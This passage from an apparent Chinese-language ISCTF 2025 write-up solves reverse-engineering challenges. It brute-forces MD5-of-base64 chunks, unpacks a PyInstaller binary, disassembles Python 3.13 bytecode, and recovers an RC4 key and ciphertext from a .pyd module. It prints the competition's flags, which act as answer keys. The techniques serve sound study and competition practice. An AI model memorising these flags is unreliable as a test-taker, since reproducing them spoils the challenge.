<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'8d13c398b72151b1dad78762553dbbd59dba9b0b2330b03b401ea4f2a6d4731d479220fe900b520f6b4753667fe1cdf9eff8d3b833a0013c4083fa1ad27d056486702bda245f3c1aa0fbf84b237d8f2dec9a80791fe66625adfe3669419a104cbb67293eaada20f79cebf69d84d326025dd35dec09a2c97ad838efa5beba9e72'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rep</span>(<span class="params">hash_data, reverse=<span class="literal">False</span></span>):</span><br><span class="line">    random.seed(<span class="number">161</span>)</span><br><span class="line">    result = <span class="built_in">list</span>(hash_data)</span><br><span class="line">    n = <span class="built_in">len</span>(result)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录正向交换序列</span></span><br><span class="line">    swaps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        swap_index = random.randint(<span class="number">0</span>, i)</span><br><span class="line">        swaps.append((i, swap_index))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        <span class="comment"># 逆向执行交换</span></span><br><span class="line">        <span class="keyword">for</span> i, swap_index <span class="keyword">in</span> <span class="built_in">reversed</span>(swaps):</span><br><span class="line">            result[i], result[swap_index] = result[swap_index], result[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 正向执行交换</span></span><br><span class="line">        <span class="keyword">for</span> i, swap_index <span class="keyword">in</span> swaps:</span><br><span class="line">            result[i], result[swap_index] = result[swap_index], result[i]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 分割flag为8组</span></span><br><span class="line">groups = [flag[i*<span class="number">32</span>:(i+<span class="number">1</span>)*<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"分组:"</span>)</span><br><span class="line"><span class="keyword">for</span> i, g <span class="keyword">in</span> <span class="built_in">enumerate</span>(groups):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"组<span class="subst">{i}</span>: <span class="subst">{g}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 对每组逆向Rep得到原始MD5</span></span><br><span class="line">original_md5s = []</span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> groups:</span><br><span class="line">    original_md5 = Rep(g, reverse=<span class="literal">True</span>)</span><br><span class="line">    original_md5s.append(original_md5)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"逆向Rep后: <span class="subst">{original_md5}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 爆破所有可能的3字节输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_original_text</span>(<span class="params">md5_target</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>*<span class="number">256</span>*<span class="number">256</span>):  <span class="comment"># 3字节所有可能</span></span><br><span class="line">        <span class="comment"># 生成3字节</span></span><br><span class="line">        b = <span class="built_in">bytes</span>([</span><br><span class="line">            (i &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">            (i &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">            i &amp; <span class="number">0xFF</span></span><br><span class="line">        ])</span><br><span class="line">        <span class="comment"># Base64编码</span></span><br><span class="line">        b64 = base64.b64encode(b)</span><br><span class="line">        <span class="comment"># 计算MD5</span></span><br><span class="line">        md5 = hashlib.md5(b64).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5 == md5_target:</span><br><span class="line">            <span class="keyword">return</span> b.decode(<span class="string">'latin-1'</span>)  <span class="comment"># 可能不是ASCII</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 逐个爆破</span></span><br><span class="line">flag_parts = []</span><br><span class="line"><span class="keyword">for</span> i, md5_target <span class="keyword">in</span> <span class="built_in">enumerate</span>(original_md5s):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n爆破第<span class="subst">{i}</span>组..."</span>)</span><br><span class="line">    found = find_original_text(md5_target)</span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        flag_parts.append(found)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"找到: <span class="subst">{found}</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"未找到匹配的3字节"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 拼接flag</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag_parts) == <span class="number">8</span>:</span><br><span class="line">    final_flag = <span class="string">''</span>.join(flag_parts)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\nFlag: <span class="subst">{final_flag}</span>"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"未能找到所有部分"</span>)</span><br></pre></td></tr></table></figure>
<p><strong>ISCTF{NO7_3x3_i5_3Lf!!!}</strong></p>
<ul>
<li><p>ezpy</p>
<blockquote>
<p>这是什么库？没见过呢</p>
</blockquote>
</li>
</ul>
<p>strings检查发现了python痕迹，pyinstaller打包</p>
<p>同样，用脚本解包,pycdc反编译失败了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─# decompyle3 ezpy.pyc &gt; ezpy_decompiled.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unsupported bytecode in file ezpy.pyc</span></span><br><span class="line"><span class="comment"># Unsupported Python version, 3.13.0, for decompilation</span></span><br></pre></td></tr></table></figure>
<p>3.13太新了，pycdc失败</p>
<p>Rycbartbad师傅先做了此题，说有花指令，看看花指令什么情况。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_obfuscation</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># 跳过可能的头部</span></span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 尝试在不同偏移加载</span></span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">500</span>, <span class="built_in">len</span>(data)), <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            code = marshal.loads(data[offset:])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"✓ 成功在偏移 <span class="subst">{offset}</span> 处加载代码对象"</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"  代码长度: <span class="subst">{<span class="built_in">len</span>(code.co_code)}</span> 字节"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 查看字节码模式</span></span><br><span class="line">            bytecode = code.co_code</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"  前100字节: <span class="subst">{bytecode[:<span class="number">100</span>].<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 统计操作码频率</span></span><br><span class="line">            <span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line">            opcodes = [bytecode[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bytecode), <span class="number">2</span>) <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(bytecode)]</span><br><span class="line">            freq = Counter(opcodes)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"  常见操作码: <span class="subst">{freq.most_common(<span class="number">10</span>)}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 查找可能的NOP（0x09）或其他花指令</span></span><br><span class="line">            nop_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> b <span class="keyword">in</span> bytecode <span class="keyword">if</span> b == <span class="number">0x09</span>)</span><br><span class="line">            <span class="keyword">if</span> nop_count &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"  发现 <span class="subst">{nop_count}</span> 个NOP指令（可能为花指令）"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 尝试反汇编</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\n  尝试反汇编（可能失败）:"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                dis.dis(code)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"  反汇编失败: <span class="subst">{e}</span>"</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">analyze_obfuscation(<span class="string">'ezpy.pyc'</span>)</span><br></pre></td></tr></table></figure>
<p>发现在开头有一个nop。可以去，也可以不管直接看字节码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'ezpy.pyc'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载主模块</span></span><br><span class="line">code = marshal.loads(data[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找main函数的代码对象</span></span><br><span class="line"><span class="keyword">for</span> const <span class="keyword">in</span> code.co_consts:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(const, <span class="string">'co_code'</span>):  <span class="comment"># 是一个代码对象</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"\n=== 函数: <span class="subst">{const.co_name}</span> ==="</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"文件: <span class="subst">{const.co_filename}</span>, 行: <span class="subst">{const.co_firstlineno}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反汇编这个函数</span></span><br><span class="line">        dis.dis(const)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果有字符串常量，显示它们</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n常量:"</span>)</span><br><span class="line">        <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(const.co_consts):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">str</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"  [<span class="subst">{i}</span>] <span class="subst">{<span class="built_in">repr</span>(c)}</span>"</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(c, <span class="built_in">bytes</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f"  [<span class="subst">{i}</span>] bytes: <span class="subst">{c[:<span class="number">50</span>]}</span><span class="subst">{<span class="string">'...'</span> <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">50</span> <span class="keyword">else</span> <span class="string">''</span>}</span>"</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 1.py</span><br><span class="line"></span><br><span class="line">=== 函数: main ===</span><br><span class="line">文件: ezpy.py, 行: 8</span><br><span class="line">  8           RESUME                   0</span><br><span class="line"></span><br><span class="line">  9           LOAD_GLOBAL              1 (input + NULL)</span><br><span class="line">              LOAD_CONST               1 (<span class="string">'Please input your flag: '</span>)</span><br><span class="line">              CALL                     1</span><br><span class="line">              LOAD_ATTR                3 (strip + NULL|self)</span><br><span class="line">              CALL                     0</span><br><span class="line">              STORE_FAST               0 (user_input)</span><br><span class="line"></span><br><span class="line"> 11           LOAD_GLOBAL              5 (check + NULL)</span><br><span class="line">              LOAD_FAST                0 (user_input)</span><br><span class="line">              CALL                     1</span><br><span class="line">              TO_BOOL</span><br><span class="line">              POP_JUMP_IF_FALSE       12 (to L1)</span><br><span class="line"></span><br><span class="line"> 12           LOAD_GLOBAL              7 (<span class="built_in">print</span> + NULL)</span><br><span class="line">              LOAD_CONST               2 (<span class="string">'Correct!'</span>)</span><br><span class="line">              CALL                     1</span><br><span class="line">              POP_TOP</span><br><span class="line">              RETURN_CONST             0 (None)</span><br><span class="line"></span><br><span class="line"> 14   L1:     LOAD_GLOBAL              7 (<span class="built_in">print</span> + NULL)</span><br><span class="line">              LOAD_CONST               3 (<span class="string">'Wrong!'</span>)</span><br><span class="line">              CALL                     1</span><br><span class="line">              POP_TOP</span><br><span class="line">              RETURN_CONST             0 (None)</span><br><span class="line"></span><br><span class="line">常量:</span><br><span class="line">  [1] <span class="string">'Please input your flag: '</span></span><br><span class="line">  [2] <span class="string">'Correct!'</span></span><br><span class="line">  [3] <span class="string">'Wrong!'</span></span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>逻辑基本清楚。</p>
<p>接下来可以用strings搜索</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings mypy.cp313-win_amd64.pyd</span></span><br></pre></td></tr></table></figure>
<p>可以找到以下字符串</p>
<p>ISCTF202H    RC4 flag checker module    check    Check if the flag is correct    </p>
<p>可以看到可能只进行了RC4加密，密钥是ISCTF202H。但是密钥明显不正常，可以猜到应该是ISCTF2025，接下来找密文</p>
<p>ida打开mypy.cp313-win_amd64.pyd</p>
<p>懒得看函数了，直接手动找data段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.rdata:000000036F4D4007 aRc4FlagChecker db 'RC4 flag checker module',0</span><br><span class="line">.rdata:000000036F4D4007                                         ; DATA XREF: .data:000000036F4D3050↑o</span><br><span class="line">.rdata:000000036F4D401F aCheck          db 'check',0            ; DATA XREF: .data:off_36F4D30A0↑o</span><br><span class="line">.rdata:000000036F4D4025 aCheckIfTheFlag db 'Check if the flag is correct',0</span><br><span class="line">.rdata:000000036F4D4025                                         ; DATA XREF: .data:000000036F4D30B8↑o</span><br><span class="line">.rdata:000000036F4D4042                 align 10h</span><br><span class="line">.rdata:000000036F4D4050 unk_36F4D4050   db  1Dh                 ; DATA XREF: sub_36F4D1519+C2↑o</span><br><span class="line">.rdata:000000036F4D4051                 db 0D5h</span><br><span class="line">.rdata:000000036F4D4052                 db  38h ; 8</span><br><span class="line">.rdata:000000036F4D4053                 db  33h ; 3</span><br><span class="line">.rdata:000000036F4D4054                 db 0AFh</span><br><span class="line">.rdata:000000036F4D4055                 db 0B5h</span><br><span class="line">.rdata:000000036F4D4056                 db  51h ; Q</span><br><span class="line">.rdata:000000036F4D4057                 db 0F3h</span><br><span class="line">.rdata:000000036F4D4058                 db  2Ch ; ,</span><br><span class="line">.rdata:000000036F4D4059                 db  6Bh ; k</span><br><span class="line">.rdata:000000036F4D405A                 db  6Eh ; n</span><br><span class="line">.rdata:000000036F4D405B                 db 0FEh</span><br><span class="line">.rdata:000000036F4D405C                 db  41h ; A</span><br><span class="line">.rdata:000000036F4D405D                 db  24h ; $</span><br><span class="line">.rdata:000000036F4D405E                 db  43h ; C</span><br><span class="line">.rdata:000000036F4D405F                 db 0D2h</span><br><span class="line">.rdata:000000036F4D4060                 db  71h ; q</span><br><span class="line">.rdata:000000036F4D4061                 db 0CFh</span><br><span class="line">.rdata:000000036F4D4062                 db 0A4h</span><br><span class="line">.rdata:000000036F4D4063                 db  4Ch ; L</span><br><span class="line">.rdata:000000036F4D4064                 db 0E3h</span><br><span class="line">.rdata:000000036F4D4065                 db  9Ah</span><br><span class="line">.rdata:000000036F4D4066                 db  9Ah</span><br><span class="line">.rdata:000000036F4D4067                 db 0B5h</span><br><span class="line">.rdata:000000036F4D4068                 db  31h ; 1</span><br><span class="line">.rdata:000000036F4D4069                 db    0</span><br><span class="line">.rdata:000000036F4D406A                 db    0</span><br><span class="line">.rdata:000000036F4D406B                 db    0</span><br><span class="line">.rdata:000000036F4D406C                 db    0</span><br><span class="line">.rdata:000000036F4D406D                 db    0</span><br><span class="line">.rdata:000000036F4D406E                 db    0</span><br><span class="line">.rdata:000000036F4D406F                 db    0</span><br><span class="line">.rdata:000000036F4D4070                 db    0</span><br><span class="line">.rdata:000000036F4D4071                 db    0</span><br><span class="line">.rdata:000000036F4D4072                 db    0</span><br><span class="line">.rdata:000000036F4D4073                 db    0</span><br><span class="line">.rdata:000000036F4D4074                 db    0</span><br><span class="line">.rdata:000000036F4D4075                 db    0</span><br><span class="line">.rdata:000000036F4D4076                 db    0</span><br><span class="line">.rdata:000000036F4D4077                 db    0</span><br><span class="line">.rdata:000000036F4D4078                 db    0</span><br><span class="line">.rdata:000000036F4D4079                 db    0</span><br><span class="line">.rdata:000000036F4D407A                 db    0</span><br><span class="line">.rdata:000000036F4D407B                 db    0</span><br><span class="line">.rdata:000000036F4D407C                 db    0</span><br><span class="line">.rdata:000000036F4D407D                 db    0</span><br><span class="line">.rdata:000000036F4D407E                 db    0</span><br><span class="line">.rdata:000000036F4D407F                 db    0</span><br></pre></td></tr></table></figure>
<p>可以看到大概率从4D4050开始的都是密文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="string">"""RC4算法实现"""</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        result.append(char ^ k)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的密文（25字节，直到0x31，后面的0是填充）</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xD5</span>, <span class="number">0x38</span>, <span class="number">0x33</span>, <span class="number">0xAF</span>, <span class="number">0xB5</span>, <span class="number">0x51</span>, <span class="number">0xF3</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0xFE</span>, <span class="number">0x41</span>, <span class="number">0x24</span>, <span class="number">0x43</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0xCF</span>, <span class="number">0xA4</span>, <span class="number">0x4C</span>, <span class="number">0xE3</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0xB5</span>,</span><br><span class="line">    <span class="number">0x31</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">keys = [<span class="string">"ISCTF2025"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key_str <span class="keyword">in</span> keys:</span><br><span class="line">    key = key_str.encode()</span><br><span class="line">    decrypted = rc4(key, ciphertext)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n密钥: '<span class="subst">{key_str}</span>'"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"解密结果: <span class="subst">{<span class="built_in">repr</span>(decrypted)}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试解码为字符串</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 先尝试ASCII</span></span><br><span class="line">        ascii_text = decrypted.decode(<span class="string">'ascii'</span>, errors=<span class="string">'ignore'</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> ascii_text <span class="keyword">and</span> <span class="built_in">any</span>(c.isprintable() <span class="keyword">for</span> c <span class="keyword">in</span> ascii_text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"ASCII文本: <span class="subst">{ascii_text}</span>"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试UTF-8</span></span><br><span class="line">        utf8_text = decrypted.decode(<span class="string">'utf-8'</span>, errors=<span class="string">'ignore'</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> utf8_text <span class="keyword">and</span> utf8_text != ascii_text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"UTF-8文本: <span class="subst">{utf8_text}</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>ISCTF{Y0U_GE7_7HE_PYD!!!}</strong></p>
<p>那ISCTF202H是怎么回事呢？</p>
<p>IDA手动找数字5，找到的结果如下:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:000000036F4D1535                 mov     word ptr [rsp+158h+var_132+8], 35h ; '5'</span><br></pre></td></tr></table></figure>
<p>所在函数反编译的结果：</p>
